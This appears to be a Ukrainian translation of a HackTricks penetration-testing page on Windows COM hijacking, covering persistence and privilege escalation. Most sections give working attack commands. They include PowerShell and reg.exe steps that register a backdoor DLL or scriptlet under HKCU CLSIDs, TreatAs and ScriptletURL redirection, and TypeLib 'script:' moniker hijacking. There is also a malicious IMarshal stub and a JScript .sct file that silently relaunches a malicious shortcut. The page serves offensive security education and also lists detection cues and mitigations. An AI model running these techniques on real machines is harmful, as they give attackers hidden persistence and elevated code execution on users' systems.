# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих компонентів COM

Оскільки користувачі можуть змінювати значення HKCU, **COM Hijacking** можна використовувати як **механізм закріплення**. За допомогою `procmon` легко знайти запити до неіснуючих записів COM у реєстрі, які зловмисник може створити. Класичні фільтри:

- Операції **RegOpenKey**.
- де _Result_ — **NAME NOT FOUND**.
- а _Path_ закінчується на **InprocServer32**.

Корисні варіанти під час пошуку:

- Також шукайте відсутні ключі **`LocalServer32`**. Деякі класи COM є позапроцесними серверами й запускатимуть EXE-файл під контролем зловмисника замість DLL.
- Окрім `InprocServer32`, шукайте операції реєстру **`TreatAs`** і **`ScriptletURL`**. У нещодавніх матеріалах із виявлення загроз і описах шкідливого ПЗ постійно згадують ці ключі, оскільки вони набагато рідше трапляються, ніж звичайні реєстрації COM, а отже, є цінними індикаторами.<sup>[[3]](#references)</sup>
- У 64-бітних системах перевіряйте 64-бітне й 32-бітне представлення (`procmon.exe` і `procmon64.exe`, `HKLM\Software\Classes` і `HKLM\Software\Classes\WOW6432Node`), оскільки 32-бітні застосунки можуть знаходити іншу реєстрацію COM.

Визначившись, який неіснуючий COM імітувати, виконайте наведені нижче команди. _Будьте обережні: імітація COM, який завантажується кожні кілька секунд, може бути надмірною._

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### COM-компоненти планувальника завдань, які можна перехопити

Завдання Windows використовують Custom Triggers для виклику COM-об’єктів, а оскільки вони виконуються через Task Scheduler, легше передбачити, коли саме вони будуть запускатися.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Переглянувши вивід, можна, наприклад, вибрати завдання, яке запускається **щоразу, коли користувач входить у систему**.

Тепер, якщо пошукати CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID**, а також у HKLM і HKCU, зазвичай виявиться, що в HKCU це значення відсутнє.

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

Тоді можна просто створити запис HKCU, і щоразу під час входу користувача запускатиметься ваш backdoor.

## Осиротілі реєстрації COM і користувацький маршалінг

Загальносистемна реєстрація COM може стати примітивом для DLL planting без зміни реєстру. Шукайте значення `InprocServer32`, яке вказує на відсутню DLL, а кінцевий шлях до якої може створити або змінити користувач із низькими привілеями. Розміщення DLL із точним ім’ям змусить будь-який процес, що активує CLSID, завантажити код зловмисника. У прикладі CrossDevice зареєстрований шлях мав вигляд `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll`, тож звичайний користувач міг створити відсутній дочірній каталог і DLL.<sup>[[5]](#references)</sup>

### Доступні для запису карти плагінів як шляхи привілейованої активації COM

Доступна для запису карта зіставлення ID плагінів із CLSID може дозволити користувачу з нижчими привілеями вибрати, який внутрішньопроцесний COM-сервер завантажить привілейована служба, навіть якщо змінити загальносистемну реєстрацію класу неможливо.<sup>[[8]](#references)[[9]](#references)</sup> У описаному випадку з Windows 11 `InstallService` звичайні користувачі могли змінювати `StaticPluginMap`; ID плагіна, що не був вбудованим, вибирав CLSID, який служба `LocalSystem` передавала до `CoCreateInstance` з `CLSCTX_INPROC_SERVER` і `IID_IInstallServicePlugin`.<sup>[[8]](#references)[[9]](#references)</sup> Зареєстрована DLL завантажується в процес служби, а не в окремий COM-хост.<sup>[[10]](#references)</sup>

Необхідні умови: ефективний доступ на запис до карти, доступний запит плагіна та шлях до DLL у `InprocServer32`, який може контролювати користувач із нижчими привілеями.<sup>[[8]](#references)[[9]](#references)</sup> У описаному випадку реєстрація CrossDevice вище забезпечувала потрібну умову щодо шляху.<sup>[[8]](#references)[[9]](#references)</sup> Об’єкт плагіна має надавати запитаний інтерфейс, але DLL завантажується до завершення `CoCreateInstance`; неможливість надати цей інтерфейс сама по собі не виключає виконання коду під час завантаження.<sup>[[8]](#references)[[11]](#references)</sup> Цей шлях через диспетчеризацію служби відрізняється від шляху через користувацький `IMarshal`, описаного нижче. Окремий примітив із використанням шляху до файла описано в розділі [DLL Hijacking](dll-hijacking/).

### `IMarshal` як примітив завантаження DLL між процесами

Зазвичай COM представляє вказівник на інтерфейс за допомогою стандартного `OBJREF`, який посилає отримувача назад до вихідного об’єкта. Об’єкт, що реалізує `IMarshal`, натомість може створити користувацький `OBJREF`. Його метод `GetUnmarshalClass` надає CLSID коду, який відновить об’єкт у процесі-отримувачі. Цей CLSID не обов’язково має ідентифікувати вихідний об’єкт. COM знаходить його як внутрішньопроцесний сервер і завантажує зареєстровану DLL до диспетчеризації методу запитаного інтерфейсу.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

Мінімальній шкідливій реалізації достатньо підмінити осиротілий CLSID у `GetUnmarshalClass`.<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

Передайте цей об’єкт через параметр проксованого методу, наприклад `[in] IUnknown *`. Інший варіант — `CoGetInstanceFromIStorage`, причому об’єкт із custom marshaling також має реалізовувати достатню частину `IStorage`, щоб пройти локальні перевірки. Автоматичне unmarshaling на віддаленому сервері визначає підставлений CLSID, тому завантаження DLL відбувається до запуску цільового методу.<sup>[[5]](#references)</sup>

Цей примітив не обмежується відсутніми реєстраціями. Він також може змусити отримувача завантажити наявну DLL custom unmarshaler і виявити помилки в її шляху завантаження або unmarshaling.<sup>[[5]](#references)</sup>

Для цього ланцюжка потрібні всі наведені нижче умови:<sup>[[5]](#references)</sup>

1. CLSID, видимий на рівні машини, вказує на відсутню або замінювану DLL in-process.
2. Атакувальник може розмістити цю DLL за шляхом, який визначається під час пошуку.
3. Активований COM-сервер out-of-process працює з потрібним рівнем привілеїв.
4. Сервер підтримує custom marshaling і надає проксований виклик, що передає об’єкт атакувальника через межу процесу.

### Пошук відсутніх in-process серверів

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) і [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) можуть перелічити машинну базу даних COM і перевірити кожен сервер за допомогою звичайного механізму пошуку модулів Win32. Це краще за `Test-Path`, оскільки деякі реєстрації містять лише ім’я файлу й покладаються на шлях пошуку завантажувача.<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

Розглядайте результат як список кандидатів, а не доказ можливості експлуатації. Визначте шлях так, як це робить завантажувач, а потім перевірте DACL першого наявного батьківського каталогу та цільової DLL, якщо вона вже існує. Відсутній файл має значення лише тоді, коли зловмисник може створити або замінити шлях, який фактично буде визначено COM.<sup>[[5]](#references)</sup>

### Виберіть і запустіть привілейований приймач

Перевірте кандидатні класи COM на наявність `RunAs`, зв’язку зі службою, доступних інтерфейсів і проксі RPC. Клас, налаштований для `SYSTEM`, але не пов’язаний із названою службою, може не активуватися напряму, оскільки RPCSS не може його запустити. У такому разі шукайте непривілейований тригер, який запускає його хост, наприклад виконуване заплановане завдання, і відтворіть будь-яку передумову з іменованою подією або IPC, потрібну для підтримання роботи сервера.<sup>[[5]](#references)</sup>

Наприклад, вразливий ланцюжок Shell Create Object Handler запускав свій хост, створюючи очікувану глобальну подію перед викликом запланованого завдання, яке може виконувати користувач.<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

Відстежте отримане посилання на об’єкт до його хоста та перевірте ідентичність і політику маршалінгу. Потім перелічіть інтерфейси й перетворіть їхні проксі на IDL, щоб знайти вхідний параметр, наприклад `IUnknown *`, який виконає маршалінг підробленого об’єкта.<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### Захист від custom-marshaling

Відповідний приймач не повинен відхиляти недовірені custom marshalers. Існують два захисти на рівні всього процесу: `EOAC_NO_CUSTOM_MARSHAL` у capabilities, переданих до `CoInitializeSecurity`, та `COMGLB_UNMARSHALING_POLICY_STRONG`, заданий через `IGlobalOptions::Set`. Якщо доступні символи, відповідний стан можна переглянути в `combase!gCapabilities` і `combase!g_GLBOPT_UnmarshalingPolicy`; NtObjectManager показує результат як `CustomMarshalAllowed`, якщо його парсер процесів підтримує цю збірку Windows.<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` дозволяє емулювати один CLSID за допомогою іншого.<sup>[[4]](#references)</sup> З погляду зловмисника це означає, що можна залишити початковий CLSID без змін, створити другий CLSID для поточного користувача, який вказує на `scrobj.dll`, а потім перенаправити справжній COM-об’єкт на шкідливий за допомогою `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Це корисно, якщо:

- цільова програма вже створює екземпляр стабільного CLSID під час входу в систему або запуску програми
- потрібне перенаправлення лише через реєстр, а не заміна початкового `InprocServer32`
- потрібно виконати локальний або віддалений scriptlet `.sct` через значення `ScriptletURL`

Приклад робочого процесу (адаптовано з публічних напрацювань Atomic Red Team і давніших досліджень зловживань реєстром COM):

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Примітки:

- `scrobj.dll` читає значення `ScriptletURL` і виконує вказаний файл `.sct`, тож payload можна зберігати як локальний файл або завантажувати віддалено через HTTP/HTTPS.
- `TreatAs` особливо зручний, коли оригінальна реєстрація COM є повною та стабільною в HKLM, оскільки достатньо невеликого перенаправлення для поточного користувача замість копіювання всього дерева.
- Щоб перевірити роботу, не чекаючи на природний тригер, можна вручну створити екземпляр фальшивого ProgID/CLSID за допомогою `rundll32.exe -sta <ProgID-or-CLSID>`, якщо цільовий клас підтримує активацію STA.

## COM TypeLib Hijacking (script: moniker persistence)

Бібліотеки типів (TypeLib) визначають інтерфейси COM і завантажуються через `LoadTypeLib()`. Під час створення екземпляра COM-сервера ОС також може завантажити пов’язану TypeLib, звернувшись до ключів реєстру в `HKCR\TypeLib\{LIBID}`. Якщо шлях до TypeLib замінити на **moniker**, наприклад `script:C:\...\evil.sct`, Windows виконає scriptlet під час обробки TypeLib — це забезпечує приховану persistence, яка спрацьовує під час взаємодії зі звичайними компонентами.

Це спостерігали у випадку з елементом керування Microsoft Web Browser (його часто завантажують Internet Explorer, програми з вбудованим WebBrowser і навіть `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Кроки (PowerShell)

1) Визначте TypeLib (LIBID), яку використовує CLSID із високою частотою викликів. Приклад CLSID, яким часто зловживають у ланцюжках malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) Вкажіть шлях TypeLib для поточного користувача на локальний скриптлет за допомогою монікера `script:` (права адміністратора не потрібні):

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) Створіть мінімальний JScript `.sct`, який повторно запускає ваш основний payload (наприклад, `.lnk`, використаний у початковому ланцюжку):

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) Запуск — відкриття IE, програми, що вбудовує елемент керування WebBrowser, або навіть звичайна робота Explorer завантажить TypeLib і виконає scriptlet, відновивши ваш ланцюжок під час входу в систему/перезавантаження.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

Нотатки
- Ви можете застосувати ту саму логіку до інших поширених COM-компонентів; спочатку завжди визначайте справжній `LIBID` у `HKCR\CLSID\{CLSID}\TypeLib`.
- У 64-бітних системах можна також додати підрозділ `win64` для 64-бітних споживачів.

## References

- [1] [Перехоплення TypeLib — нова техніка COM persistence (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research — кампанія ZipLine: складна фішингова атака на компанії США](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Повторний розгляд COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Ключ CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero — техніки експлуатації Windows: осиротілі реєстрації COM-об’єктів](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn — інтерфейс IMarshal](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications — MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [PoC Dark Elevator і технічний опис (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: підвищення локальних привілеїв через службу встановлення Windows (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [Перелік CLSCTX (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [Функція CoCreateInstance (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

